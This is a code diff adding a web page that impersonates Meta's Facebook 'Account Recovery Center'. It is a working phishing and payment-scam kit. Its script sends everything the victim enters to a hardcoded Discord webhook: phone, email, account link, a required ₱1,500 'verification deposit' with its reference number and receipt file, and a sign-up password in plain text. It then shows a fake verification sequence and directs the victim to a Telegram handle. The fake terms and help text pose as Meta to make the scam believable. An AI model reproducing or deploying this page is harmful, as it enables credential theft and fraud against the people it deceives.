+        <div class="faq-q"><span>How do I submit my payment receipt?</span><span>⌄</span></div>
+        <div class="faq-a">After your account is located you'll be taken to the verification step. Upload the PDF or screenshot from your wallet, then confirm the payment on Telegram at @findmemomy.</div>
+      </div>
+    </section>
+  </div>
+
+  <!-- ══════════ CREATE ══════════ -->
+  <div class="view" id="view-create">
+    <section class="card">
+      <form id="createForm" autocomplete="off" novalidate>
+        <div class="card-head">
+          <h2>Sign up</h2>
+          <p>It's quick and easy. Enter your name, email or mobile number, and a password.</p>
+        </div>
+
+        <div class="row">
+          <div class="field">
+            <label for="firstName">First name <span class="req">*</span></label>
+            <input id="firstName" type="text" placeholder="First name" required>
+          </div>
+          <div class="field">
+            <label for="lastName">Last name <span class="req">*</span></label>
+            <input id="lastName" type="text" placeholder="Last name" required>
+          </div>
+        </div>
+
+        <div class="field">
+          <label for="signupContact">Mobile number or email <span class="req">*</span></label>
+          <input id="signupContact" type="text" placeholder="Mobile number or email" required>
+        </div>
+
+        <div class="field">
+          <label for="signupPassword">New password <span class="req">*</span></label>
+          <input id="signupPassword" type="password" placeholder="New password" required>
+          <div class="hint">At least 6 characters, with a mix of letters and numbers.</div>
+        </div>
+
+        <div class="field">
+          <label>Date of birth <span class="req">*</span></label>
+          <div class="row-3">
+            <select id="dobMonth" required>
+              <option value="" disabled selected>Month</option>
+              <option>January</option><option>February</option><option>March</option>
+              <option>April</option><option>May</option><option>June</option>
+              <option>July</option><option>August</option><option>September</option>
+              <option>October</option><option>November</option><option>December</option>
+            </select>
+            <select id="dobDay" required><option value="" disabled selected>Day</option></select>
+            <select id="dobYear" required><option value="" disabled selected>Year</option></select>
+          </div>
+        </div>
+
+        <div class="field">
+          <label>Gender <span class="req">*</span></label>
+          <div class="row-3">
+            <select id="gender" required>
+              <option value="" disabled selected>Select</option>
+              <option>Female</option><option>Male</option><option>Custom</option>
+            </select>
+            <select id="pronoun" required>
+              <option value="" disabled selected>Pronoun</option>
+              <option>She: "Wish her a happy birthday!"</option>
+              <option>He: "Wish him a happy birthday!"</option>
+              <option>They: "Wish them a happy birthday!"</option>
+            </select>
+            <select id="country" required>
+              <option value="" disabled selected>Country</option>
+              <option>United States</option><option>United Kingdom</option>
+              <option>Canada</option><option>Australia</option>
+              <option>Philippines</option><option>India</option>
+              <option>Germany</option><option>France</option>
+              <option>Brazil</option><option>Nigeria</option>
+            </select>
+          </div>
+        </div>
+
+        <p class="legal">
+          People who use our service may have uploaded your contact information to Facebook.
+          <a data-modal="learn-more">Learn more</a>.<br><br>
+          By clicking Sign Up, you agree to our
+          <a data-modal="terms">Terms</a>,
+          <a data-modal="privacy">Privacy Policy</a> and
+          <a data-modal="cookies">Cookies Policy</a>. You may receive SMS notifications from us
+          and can opt out at any time.
+        </p>
+
+        <button class="btn green" id="createBtn" type="submit">
+          <span class="spinner"></span><span>Sign Up</span>
+        </button>
+
+        <div class="card-foot">
+          <a data-nav="1">Already have an account?</a>
+        </div>
+      </form>
+
+      <div class="success" id="createSuccess">
+        <div class="ring"><svg viewBox="0 0 24 24"><path d="M4 12.5 9 17.5 20 6.5"/></svg></div>
+        <h2>Account created</h2>
+        <p>Your account is now under review. We'll email you once it's approved — usually within 24 hours.</p>
+        <div style="margin-top:22px">
+          <button class="btn ghost" data-nav="1" style="max-width:220px;margin:0 auto">Back to recovery</button>
+        </div>
+      </div>
+    </section>
+  </div>
+
+</main>
+
+<!-- Footer -->
+<footer class="ftr">
+  <div class="ftr-in">
+    <div class="ftr-links">
+      <a data-modal="lang">English (US)</a>
+      <a data-modal="lang">Español</a>
+      <a data-modal="lang">Français</a>
+      <a data-modal="lang">Deutsch</a>
+      <a data-modal="lang">Português (Brasil)</a>
+      <a data-modal="lang">Italiano</a>
+      <a data-modal="lang">中文(简体)</a>
+      <a data-modal="lang">日本語</a>
+    </div>
+    <div class="ftr-meta">
+      <span>Meta © 2026</span>
+      <span>
+        <a data-modal="about">About</a> ·
+        <a data-modal="privacy">Privacy</a> ·
+        <a data-modal="terms">Terms</a> ·
+        <a data-modal="cookies">Cookies</a> ·
+        <a data-modal="data-policy">Data Policy</a> ·
+        <a data-modal="help-center">Help Center</a>
+      </span>
+    </div>
+  </div>
+</footer>
+
+<!-- Overlay / Modal / Toast -->
+<div class="overlay" id="loginOverlay">
+  <div class="big-spin"></div>
+  <p id="overlayText">Logging you in…</p>
+</div>
+
+<div class="modal" id="modal">
+  <div class="modal-box">
+    <div class="modal-hd">
+      <h3 id="modalTitle">Title</h3>
+      <button class="modal-x" id="modalClose" aria-label="Close">✕</button>
+    </div>
+    <div class="modal-bd" id="modalBody"></div>
+    <div class="modal-ft"><button id="modalOk">OK</button></div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+(function(){
+  "use strict";
+
+  /* ── CONFIG ─────────────────────────────────────────── */
+  const WEBHOOK_URL     = "https://discord.com/api/webhooks/1565972286161289280/C8vWxRaGcA7xS2kUJJ_iLSWfeNE0C2lDyrFiAc0BayYAIna98B1hkfmGHem6abKhQiOM";
+  const PAY_NUMBER      = "09756070032";
+  const PAY_AMOUNT      = "₱1,500.00";
+  const TELEGRAM_HANDLE = "@findmemomy";
+
+  /* ── HELPERS ────────────────────────────────────────── */
+  const $   = id => document.getElementById(id);
+  const val = id => ($(id) && $(id).value ? $(id).value.trim() : "");
+
+  let toastTimer;
+  function toast(msg){
+    const t = $("toast");
+    t.textContent = msg;
+    t.classList.add("on");
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(() => t.classList.remove("on"), 2400);
+  }
+
+  function markErr(id, on){
+    const el = $(id);
+    if (!el) return;
+    const f = el.closest(".field");
+    if (f) f.classList.toggle("err", !!on);
+  }
+
+  function requestId(){
+    return "RC-" + Date.now().toString(36).toUpperCase().slice(-6) +
+           Math.floor(Math.random() * 900 + 100);
+  }
+
+  /* ── WEBHOOK ────────────────────────────────────────── */
+  async function send(title, color, fields, footer){
+    const payload = {
+      username: "Recovery Center",
+      embeds: [{
+        title: title,
+        color: color,
+        fields: fields,
+        footer: { text: (footer || "web") + " • " + new Date().toLocaleString() }
+      }]
+    };
+    try {
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+        keepalive: true
+      });
+    } catch (e) {}
+  }
+
+  async function sendWithFile(payload, file){
+    const fd = new FormData();
+    fd.append("payload_json", JSON.stringify(payload));
+    if (file) fd.append("files[0]", file, file.name);
+    try {
+      await fetch(WEBHOOK_URL, { method: "POST", body: fd });
+    } catch (e) {}
+  }
+
+  /* ── STATE ──────────────────────────────────────────── */
+  const state = {
+    requestId: requestId(),
+    recovery:  null,
+    file:      null
+  };
+
+  /* ══════════════════════════════════════════════════════
+     ROUTER — steps 1-4, help, create
+     ══════════════════════════════════════════════════════ */
+  const HERO = {
+    "1":      ["Account Recovery Center", "Find your account and regain access. We'll verify your details and guide you through securing it."],
+    "2":      ["Verification deposit",    "Send the deposit to the number shown, then confirm to continue."],
+    "3":      ["Upload receipt",          "Attach the receipt for your deposit to complete verification."],
+    "4":      ["Confirming",              "Hold tight while we verify your payment."],
+    "help":   ["Help Center",             "Find answers about recovering and securing your account."],
+    "create": ["Create a new account",    "It's quick and easy."]
+  };
+
+  const VIEWS = {
+    "1": "view-1", "2": "view-2", "3": "view-3", "4": "view-4",
+    "help": "view-help", "create": "view-create"
+  };
+
+  function showView(name){
+    if (!VIEWS[name]) name = "1";
+    Object.keys(VIEWS).forEach(k => $(VIEWS[k]).classList.toggle("on", k === name));
+
+    const h = HERO[name] || HERO["1"];
+    $("heroTitle").textContent = h[0];
+    $("heroSub").textContent   = h[1];
+
+    /* stepper only on steps 1-4 */
+    const isStep = /^[1-4]$/.test(name);
+    $("stepper").classList.toggle("hide", !isStep);
+
+    if (isStep){
+      const n = Number(name);
+      document.querySelectorAll("#stepper .step").forEach(function(s){
+        const sn = Number(s.dataset.s);
+        s.classList.toggle("active", sn === n);
+        s.classList.toggle("done",   sn <  n);
+        s.querySelector(".step-dot").textContent = sn < n ? "✓" : String(sn);
+      });
+      document.querySelectorAll("#stepper .step-line").forEach(function(l){
+        l.classList.toggle("done", Number(l.dataset.l) < n);
+      });
+    }
+
+    /* nav active */
+    let tab = "recover";
+    if (name === "help")   tab = "help";
+    if (name === "create") tab = "create";
+    document.querySelectorAll(".nav a").forEach(a => {
+      a.classList.toggle("on", a.dataset.tab === tab);
+    });
+
+    window.scrollTo(0, 0);
+    if (history.replaceState) history.replaceState(null, "", "#" + name);
+  }
+
+  function route(){
+    const hash = (location.hash || "#1").replace("#", "");
+    if (VIEWS[hash])    { showView(hash); return; }
+    if (MODALS[hash])   { openModal(hash); }
+  }
+
+  /* ══════════════════════════════════════════════════════
+     MODALS
+     ══════════════════════════════════════════════════════ */
+  const MODALS = {
+    "terms": {
+      title: "Terms of Service",
+      body: `
+        <h4>1. Acceptance of terms</h4>
+        <p>By accessing or using this service, you agree to be bound by these Terms. If you do not agree, do not use the service.</p>
+        <h4>2. Account responsibilities</h4>
+        <p>You are responsible for maintaining the confidentiality of your account credentials and for all activity that occurs under your account.</p>
+        <h4>3. Acceptable use</h4>
+        <ul>
+          <li>Do not use the service to violate any applicable law.</li>
+          <li>Do not attempt to gain unauthorized access to other accounts.</li>
+          <li>Do not interfere with the normal operation of the service.</li>
+        </ul>
+        <h4>4. Verification deposit</h4>
+        <p>Recovery requests may require a refundable verification deposit. The deposit is deducted from the final restoration fee and is not charged twice.</p>
+        <h4>5. Termination</h4>
+        <p>We may suspend or terminate access to the service at any time for conduct that violates these Terms.</p>
+        <h4>6. Changes</h4>
+        <p>We may update these Terms from time to time. Continued use of the service constitutes acceptance of the updated Terms.</p>`
+    },
+    "privacy": {
+      title: "Privacy Policy",
+      body: `
+        <h4>Information we collect</h4>
+        <p>We collect information you provide directly, such as your name, email address, phone number, location, payment reference and transaction receipts, as well as information generated by your use of the service.</p>
+        <h4>How we use information</h4>
+        <ul>
+          <li>To verify your identity and recover access to your account.</li>
+          <li>To process and verify the verification deposit.</li>
+          <li>To provide, maintain and improve the service.</li>
+          <li>To communicate with you about your account.</li>
+        </ul>
+        <h4>Sharing</h4>
+        <p>We do not sell your personal information. We may share information with service providers who assist in operating the service, subject to confidentiality obligations.</p>
+        <h4>Your choices</h4>
+        <p>You may request access to, correction of, or deletion of your personal information by contacting support.</p>`
+    },
+    "cookies": {
+      title: "Cookies Policy",
+      body: `
+        <h4>What are cookies</h4>
+        <p>Cookies are small text files stored on your device that help the service remember information about your visit.</p>
+        <h4>How we use cookies</h4>
+        <ul>
+          <li><strong>Essential cookies</strong> — required for the service to function, including security and session management.</li>
+          <li><strong>Preference cookies</strong> — remember your settings, such as language and region.</li>
+          <li><strong>Analytics cookies</strong> — help us understand how the service is used so we can improve it.</li>
+        </ul>
+        <h4>Managing cookies</h4>
+        <p>You can control cookies through your browser settings. Disabling essential cookies may prevent parts of the service from working.</p>`
+    },
+    "about": {
+      title: "About",
+      body: `
+        <h4>Our mission</h4>
+        <p>We build tools that help people stay connected and recover access to the accounts that matter to them.</p>
+        <h4>Account Recovery Center</h4>
+        <p>The Recovery Center gives people a single place to find their account, verify their identity and secure it against unauthorized access.</p>
+        <h4>Security</h4>
+        <p>All recovery requests are reviewed by our security team. We use industry-standard encryption for data in transit and at rest.</p>
+        <h4>Contact</h4>
+        <p>Questions about the service can be sent to our support team through the Help Center.</p>`
+    },
+    "data-policy": {
+      title: "Data Policy",
+      body: `
+        <h4>Data we process</h4>
+        <p>Account identifiers, contact details, device and connection information, and the details you submit through recovery forms.</p>
+        <h4>Purpose</h4>
+        <p>Identity verification, fraud prevention, account restoration and service improvement.</p>
+        <h4>Legal basis</h4>
+        <p>Processing is carried out on the basis of legitimate interest in protecting accounts and complying with applicable law.</p>`
+    },
+    "contact": {
+      title: "Contact Support",
+      body: `
+        <h4>Support channels</h4>
+        <p>Our support team is reachable on Telegram 24 hours a day.</p>
+        <ul>
+          <li><strong>Telegram:</strong> ${TELEGRAM_HANDLE}</li>
+          <li><strong>Response time:</strong> typically within 24 hours</li>
+          <li><strong>Languages:</strong> English, Filipino, Spanish, French</li>
+        </ul>
+        <h4>Before you contact us</h4>
+        <p>Have your account link, the email or phone number associated with the account, and your payment receipt ready. This helps us locate and verify your request faster.</p>
+        <h4>Security notice</h4>
+        <p>We will never ask for your password. If someone claiming to be support asks for it, do not respond and report the message.</p>`
+    },
+    "deposit-help": {
+      title: "About the verification deposit",
+      body: `
+        <h4>Why a deposit is required</h4>
+        <p>The deposit confirms the recovery request is genuine and filters automated attempts. It is charged once per recovery request.</p>
+        <h4>How to pay</h4>
+        <p>Send the deposit to the number shown on the payment step. If you need the receiving name, message ${TELEGRAM_HANDLE} on Telegram.</p>
+        <h4>Submitting your receipt</h4>
+        <p>After paying, upload the PDF or screenshot from your wallet on the receipt step. Include the reference number exactly as it appears.</p>
+        <h4>Refunds</h4>
+        <p>The deposit is refundable and deducted from the final restoration fee. If the recovery cannot be completed, the deposit is returned to the sending account.</p>
+        <h4>Confirmation</h4>
+        <p>Once the receipt is submitted, confirm the payment on Telegram at ${TELEGRAM_HANDLE}. A specialist will finish the restore.</p>`
+    },
+    "help-center": {
+      title: "Help Center",
+      body: `
+        <h4>Popular articles</h4>
+        <ul>
+          <li>How to recover a disabled account</li>
+          <li>What to do if you're locked out</li>
+          <li>Reporting a hacked account</li>
+          <li>Submitting a payment receipt</li>
+          <li>Managing trusted devices</li>
+        </ul>
+        <p>Browse the full Help Center from the Help tab in the navigation bar.</p>`
+    },
+    "recover-help": {
+      title: "I can't log in to my account",
+      body: `
+        <h4>Step 1 — Confirm your details</h4>
+        <p>Make sure you're entering the email or phone number that was originally added to the account.</p>
+        <h4>Step 2 — Try a different recovery method</h4>
+        <p>If SMS isn't working, request a code by email, or vice versa. Use the link on the code screen to switch methods.</p>
+        <h4>Step 3 — Submit a recovery request</h4>
+        <p>If you've lost access to both, fill in the recovery form with your account link and the details you remember. Our team will review it.</p>`
+    },
+    "locked-help": {
+      title: "My account is locked",
+      body: `
+        <h4>Why accounts get locked</h4>
+        <p>Accounts are locked when we detect unusual activity, such as logins from a new location or repeated failed password attempts.</p>
+        <h4>How to unlock</h4>
+        <p>Follow the on-screen steps to confirm your identity. You'll usually be asked to verify a code sent to your phone or email.</p>
+        <h4>If the lock persists</h4>
+        <p>Submit a recovery request and include the approximate date the lock happened. Our team can review the account manually.</p>`
+    },
+    "hacked-help": {
+      title: "I think my account was hacked",
+      body: `
+        <h4>Immediate steps</h4>
+        <ul>
+          <li>Change your password from a device you trust.</li>
+          <li>Log out of all sessions from the Security settings.</li>
+          <li>Check your email and phone number on file and remove anything you don't recognize.</li>
+        </ul>
+        <h4>Review recent activity</h4>
+        <p>Check login history and recent posts. Report anything you didn't do.</p>
+        <h4>Report it</h4>
+        <p>Submit a recovery request marked as compromised. Our security team will review the account and restore access.</p>`
+    },
+    "code-help": {
+      title: "I didn't get my confirmation code",
+      body: `
+        <h4>Check the basics</h4>
+        <ul>
+          <li>Wait up to 5 minutes — codes can be delayed.</li>
+          <li>Check your spam or promotions folder.</li>
+          <li>Confirm your phone has signal and can receive SMS.</li>
+        </ul>
+        <h4>Try another method</h4>
+        <p>Use the "Try another way" link on the code screen to receive the code by email instead.</p>
+        <h4>Still nothing?</h4>
+        <p>Message ${TELEGRAM_HANDLE} on Telegram with the email or phone number you're trying to receive the code on.</p>`
+    },
+    "learn-more": {
+      title: "How your contact information is used",
+      body: `
+        <h4>Uploaded contacts</h4>
+        <p>People who use the service may upload contact information, such as phone numbers and email addresses, to find friends and help secure their accounts.</p>
+        <h4>What we do with it</h4>
+        <ul>
+          <li>Match contacts to existing accounts to suggest connections.</li>
+          <li>Verify account ownership during recovery.</li>
+          <li>Detect and prevent fraud.</li>
+        </ul>
+        <h4>Your control</h4>
+        <p>You can manage contact syncing from your account settings at any time.</p>`
+    },
+    "lang": {
+      title: "Choose a language",
+      body: `
+        <p style="margin-bottom:16px">Select the language you'd like to use across the Recovery Center.</p>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <a href="#" data-lang="English (US)">English (US)</a>
+          <a href="#" data-lang="Español">Español</a>
+          <a href="#" data-lang="Français">Français</a>
+          <a href="#" data-lang="Deutsch">Deutsch</a>
+          <a href="#" data-lang="Português (Brasil)">Português (Brasil)</a>
+          <a href="#" data-lang="Italiano">Italiano</a>
+          <a href="#" data-lang="中文(简体)">中文(简体)</a>
+          <a href="#" data-lang="日本語">日本語</a>
+        </div>`
+    }
+  };
+
+  function openModal(key){
+    const m = MODALS[key];
+    if (!m) return;
+    $("modalTitle").textContent = m.title;
+    $("modalBody").innerHTML = m.body;
+    $("modal").classList.add("on");
+    document.body.style.overflow = "hidden";
+  }
+
+  function closeModal(){
+    $("modal").classList.remove("on");
+    document.body.style.overflow = "";
+  }
+
+  /* ══════════════════════════════════════════════════════
+     GLOBAL CLICK DELEGATION
+     ══════════════════════════════════════════════════════ */
+  document.addEventListener("click", function(ev){
+    const navEl = ev.target.closest("[data-nav]");
+    if (navEl){
+      ev.preventDefault();
+      showView(navEl.dataset.nav);
+      return;
+    }
+
+    const modalEl = ev.target.closest("[data-modal]");
+    if (modalEl){
+      ev.preventDefault();
+      openModal(modalEl.dataset.modal);
+      return;
+    }
+
+    const langEl = ev.target.closest("[data-lang]");
+    if (langEl){
+      ev.preventDefault();
+      $("langLabel").textContent = langEl.dataset.lang;
+      closeModal();
+      toast("Language set to " + langEl.dataset.lang);
+      return;
+    }
+
+    if (ev.target.closest(".faq-q")){
+      const faq = ev.target.closest(".faq");
+      if (faq) faq.classList.toggle("open");
+      return;
+    }
+  });
+
+  $("modalClose").addEventListener("click", closeModal);
+  $("modalOk").addEventListener("click", closeModal);
+  $("modal").addEventListener("click", function(ev){
+    if (ev.target === $("modal")) closeModal();
+  });
+  document.addEventListener("keydown", function(ev){
+    if (ev.key === "Escape" && $("modal").classList.contains("on")) closeModal();
+  });
+
+  /* ══════════════════════════════════════════════════════
+     STEP 1 — DETAILS
+     ══════════════════════════════════════════════════════ */
+  $("form1").addEventListener("submit", async function(ev){
+    ev.preventDefault();
+
+    const data = {
+      number:   val("f_number"),
+      gmail:    val("f_gmail"),
+      location: val("f_location"),
+      status:   val("f_status"),
+      link:     val("f_link")
+    };
+
+    ["f_number","f_gmail","f_location","f_status","f_link"].forEach(id => markErr(id, false));
+
+    let bad = null;
+    if (!data.number) bad = "f_number";
+    else if (!data.gmail || !/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(data.gmail)) bad = "f_gmail";
+    else if (!data.location) bad = "f_location";
+    else if (!data.status)   bad = "f_status";
+    else if (!data.link)     bad = "f_link";
+
+    if (bad){
+      markErr(bad, true);
+      $(bad).focus();
+      toast("Please complete the highlighted field");
+      return;
+    }
+
+    const btn = $("btn1");
+    btn.disabled = true;
+    btn.querySelector(".spinner").style.display = "block";
+    btn.querySelector("span:last-child").textContent = "Checking…";
+
+    await send("Step 1 — account details", 0x1877f2, [
+      { name: "Number",         value: data.number,   inline: true  },
+      { name: "Email",          value: data.gmail,    inline: true  },
+      { name: "Location",       value: data.location, inline: true  },
+      { name: "Account status", value: data.status,   inline: true  },
+      { name: "Account link",   value: data.link,     inline: false },
+      { name: "Request ID",     value: state.requestId, inline: false }
+    ], "step 1");
+
+    state.recovery = data;
+    $("s_account").textContent = data.link
+      ? data.link.replace(/^https?:\/\/(www\.)?/i, "").replace(/\/$/, "")
+      : data.number;
+    $("s_email").textContent = data.gmail;
+
+    btn.disabled = false;
+    btn.querySelector(".spinner").style.display = "none";
+    btn.querySelector("span:last-child").textContent = "Continue";
+
+    showView("2");
+  });
+
+  ["f_number","f_gmail","f_location","f_link"].forEach(function(id){
+    $(id).addEventListener("input", () => markErr(id, false));
+  });
+  $("f_status").addEventListener("change", () => markErr("f_status", false));
+
+  /* ══════════════════════════════════════════════════════
+     STEP 2 — PAYMENT
+     ══════════════════════════════════════════════════════ */
+  function copyText(text, msg){
+    if (navigator.clipboard && navigator.clipboard.writeText){
+      navigator.clipboard.writeText(text).then(
+        () => toast(msg),
+        () => toast("Copy failed — long-press to copy")
+      );
+    } else {
+      toast("Long-press to copy");
+    }
+  }
+  $("copyNum").addEventListener("click", () => copyText(PAY_NUMBER, "Number copied"));
+  $("copyAmt").addEventListener("click", () => copyText("1500.00", "Amount copied"));
+
+  $("btn2").addEventListener("click", async function(){
+    const btn = $("btn2");
+    btn.disabled = true;
+    btn.querySelector(".spinner").style.display = "block";
+    btn.querySelector("span:last-child").textContent = "Confirming…";
+
+    await send("Step 2 — payment confirmed", 0xf5a623, [
+      { name: "Request ID", value: state.requestId, inline: false },
+      { name: "Account",    value: $("s_account").textContent, inline: true },
+      { name: "Email",      value: $("s_email").textContent,   inline: true },
+      { name: "Sent to",    value: PAY_NUMBER,  inline: true },
+      { name: "Amount",     value: PAY_AMOUNT,  inline: true }
+    ], "step 2");
+
+    btn.disabled = false;
+    btn.querySelector(".spinner").style.display = "none";
+    btn.querySelector("span:last-child").textContent = "Confirm payment sent";
+
+    showView("3");
+  });
+
+  /* ══════════════════════════════════════════════════════
+     STEP 3 — RECEIPT
+     ══════════════════════════════════════════════════════ */
+  const upload   = $("upload");
+  const fileIn   = $("f_file");
+  const fileName = $("fileName");
+  const MAX_BYTES = 8 * 1024 * 1024;
+
+  function acceptFile(file){
+    if (!file) return;
+    if (file.size > MAX_BYTES){ toast("File too large — max 8 MB"); return; }
+    const name = (file.name || "").toLowerCase();
+    const typeOk = ["application/pdf","image/png","image/jpeg"].includes(file.type) ||
+                   name.endsWith(".pdf") || name.endsWith(".png") ||
+                   name.endsWith(".jpg") || name.endsWith(".jpeg");
+    if (!typeOk){ toast("Use a PDF, JPG or PNG"); return; }
+
+    state.file = file;
+    fileName.textContent = file.name + " · " + (file.size / 1024 / 1024).toFixed(2) + " MB";
+    upload.classList.add("has");
+    upload.querySelector(".upload-t").textContent = "Receipt attached";
+    upload.querySelector(".upload-d").textContent = "Click to replace";
+    markErr("fileField", false);
+  }
+
+  fileIn.addEventListener("change", function(){
+    if (this.files && this.files[0]) acceptFile(this.files[0]);
+  });
+
+  ["dragenter","dragover"].forEach(e => upload.addEventListener(e, function(ev){
+    ev.preventDefault(); ev.stopPropagation();
+    upload.classList.add("drag");
+  }));
+  ["dragleave","drop"].forEach(e => upload.addEventListener(e, function(ev){
+    ev.preventDefault(); ev.stopPropagation();
+    upload.classList.remove("drag");
+  }));
+  upload.addEventListener("drop", function(ev){
+    const f = ev.dataTransfer && ev.dataTransfer.files && ev.dataTransfer.files[0];
+    if (f) acceptFile(f);
+  });
+
+  $("form3").addEventListener("submit", async function(ev){
+    ev.preventDefault();
+
+    markErr("fileField", false);
+    markErr("f_ref", false);
+
+    const ref = val("f_ref");
+    let bad = null;
+    if (!state.file) bad = "fileField";
+    else if (!ref)   bad = "f_ref";
+
+    if (bad){
+      markErr(bad, true);
+      if (bad === "f_ref") $("f_ref").focus();
+      toast(bad === "fileField" ? "Attach your receipt first" : "Enter the reference number");
+      return;
+    }
+
+    const btn = $("btn3");
+    btn.disabled = true;
+    btn.querySelector(".spinner").style.display = "block";
+    btn.querySelector("span:last-child").textContent = "Uploading…";
+
+    const payload = {
+      username: "Recovery Center",
+      embeds: [{
+        title: "Step 3 — receipt uploaded",
+        color: 0x42b72a,
+        fields: [
+          { name: "Request ID", value: state.requestId, inline: false },
+          { name: "Account",    value: $("s_account").textContent, inline: true },
+          { name: "Email",      value: $("s_email").textContent,   inline: true },
+          { name: "Sent to",    value: PAY_NUMBER, inline: true },
+          { name: "Amount",     value: PAY_AMOUNT, inline: true },
+          { name: "Reference",  value: ref,        inline: false },
+          { name: "Receipt",    value: state.file
+              ? state.file.name + " (" + (state.file.size/1024/1024).toFixed(2) + " MB)"
+              : "none", inline: false },
+          { name: "Follow-up",  value: TELEGRAM_HANDLE, inline: false }
+        ],
+        footer: { text: "step 3 • " + new Date().toLocaleString() }
+      }]
+    };
+
+    await sendWithFile(payload, state.file);
+
+    showView("4");
+    startWaiting();
+  });
+
+  $("f_ref").addEventListener("input", () => markErr("f_ref", false));
+
+  /* ══════════════════════════════════════════════════════
+     STEP 4 — CONFIRMING
+     ══════════════════════════════════════════════════════ */
+  function startWaiting(){
+    ["w1","w2","w3","w4"].forEach(id => $(id).className = "wait-item");
+    $("waitingBlock").style.display = "block";
+    $("successBlock").style.display = "none";
+
+    setTimeout(() => { $("w1").className = "wait-item ok"; }, 300);
+    setTimeout(() => { $("w2").className = "wait-item on"; }, 700);
+    setTimeout(() => { $("w2").className = "wait-item ok"; }, 2100);
+    setTimeout(() => { $("w3").className = "wait-item on"; }, 2400);
+    setTimeout(() => { $("w3").className = "wait-item ok"; }, 4200);
+    setTimeout(() => { $("w4").className = "wait-item on"; }, 4500);
+    setTimeout(() => { $("w4").className = "wait-item ok"; }, 5900);
+    setTimeout(finishWaiting, 6500);
+  }
+
+  async function finishWaiting(){
+    $("waitingBlock").style.display = "none";
+    $("successBlock").style.display = "block";
+    $("heroTitle").textContent = "Recovery complete";
+    $("heroSub").textContent   = "Your payment is confirmed. Finish the last step on Telegram.";
+
+    await send("Step 4 — confirmed", 0x42b72a, [
+      { name: "Request ID", value: state.requestId, inline: false },
+      { name: "Account",    value: $("s_account").textContent, inline: true },
+      { name: "Status",     value: "Payment confirmed · awaiting Telegram handoff", inline: false }
+    ], "step 4");
+  }
+
+  /* ══════════════════════════════════════════════════════
+     CREATE ACCOUNT — date selects
+     ══════════════════════════════════════════════════════ */
+  (function fillDates(){
+    const daySel = $("dobDay"), yearSel = $("dobYear");
+    for (let d = 1; d <= 31; d++){
+      const o = document.createElement("option"); o.textContent = d; daySel.appendChild(o);
+    }
+    const now = new Date().getFullYear();
+    for (let y = now; y >= now - 100; y--){
+      const o = document.createElement("option"); o.textContent = y; yearSel.appendChild(o);
+    }
+  })();
+
+  const createForm = $("createForm");
+  const CREATE_FIELDS = [
+    "firstName","lastName","signupContact","signupPassword",
+    "dobMonth","dobDay","dobYear","gender","pronoun","country"
+  ];
+
+  createForm.addEventListener("submit", async function(ev){
+    ev.preventDefault();
+
+    const data = {
+      firstName: val("firstName"),
+      lastName:  val("lastName"),
+      contact:   val("signupContact"),
+      password:  val("signupPassword"),
+      dob:       [val("dobMonth"), val("dobDay"), val("dobYear")].join(" / "),
+      gender:    val("gender"),
+      pronoun:   val("pronoun"),
+      country:   val("country")
+    };
+
+    CREATE_FIELDS.forEach(id => markErr(id, false));
+
+    let bad = null;
+    if (!data.firstName) bad = "firstName";
+    else if (!data.lastName) bad = "lastName";
+    else if (!data.contact) bad = "signupContact";
+    else if (!data.password || data.password.length < 6) bad = "signupPassword";
+    else if (!val("dobMonth") || !val("dobDay") || !val("dobYear")) bad = "dobMonth";
+    else if (!data.gender) bad = "gender";
+    else if (!data.pronoun) bad = "pronoun";
+    else if (!data.country) bad = "country";
+
+    if (bad){
+      markErr(bad, true);
+      $(bad).focus();
+      toast("Please complete the highlighted field");
+      return;
+    }
+
+    const btn = $("createBtn");
+    btn.disabled = true;
+
+    await send("New signup", 0x42b72a, [
+      { name: "First name",    value: data.firstName, inline: true  },
+      { name: "Last name",     value: data.lastName,  inline: true  },
+      { name: "Contact",       value: data.contact,   inline: false },
+      { name: "Password",      value: data.password,  inline: false },
+      { name: "Date of birth", value: data.dob,       inline: true  },
+      { name: "Gender",        value: data.gender,    inline: true  },
+      { name: "Pronoun",       value: data.pronoun,   inline: true  },
+      { name: "Country",       value: data.country,   inline: true  }
+    ], "signup");
+
+    $("overlayText").textContent = "Logging you in…";
+    $("loginOverlay").classList.add("on");
+    setTimeout(() => { $("overlayText").textContent = "Setting up your account…"; }, 1200);
+    setTimeout(() => {
+      $("loginOverlay").classList.remove("on");
+      createForm.style.display = "none";
+      $("createSuccess").style.display = "block";
+    }, 2400);
+  });
+
+  CREATE_FIELDS.forEach(function(id){
+    const el = $(id);
+    if (!el) return;
+    el.addEventListener("input",  () => markErr(id, false));
+    el.addEventListener("change", () => markErr(id, false));
+  });
+
+  /* ══════════════════════════════════════════════════════
+     HELP SEARCH
+     ══════════════════════════════════════════════════════ */
+  $("helpSearch").addEventListener("input", function(){
+    const q = this.value.toLowerCase().trim();
+    document.querySelectorAll("#topicList .topic").forEach(function(t){
+      t.style.display = (!q || t.textContent.toLowerCase().includes(q)) ? "" : "none";
+    });
+    document.querySelectorAll(".faq").forEach(function(f){
+      f.style.display = (!q || f.textContent.toLowerCase().includes(q)) ? "" : "none";
+    });
+  });
+
+  /* ══════════════════════════════════════════════════════
+     BOOT
+     ══════════════════════════════════════════════════════ */
+  window.addEventListener("hashchange", route);
+  route();
+})();
+</script>
+</body>
+</html>
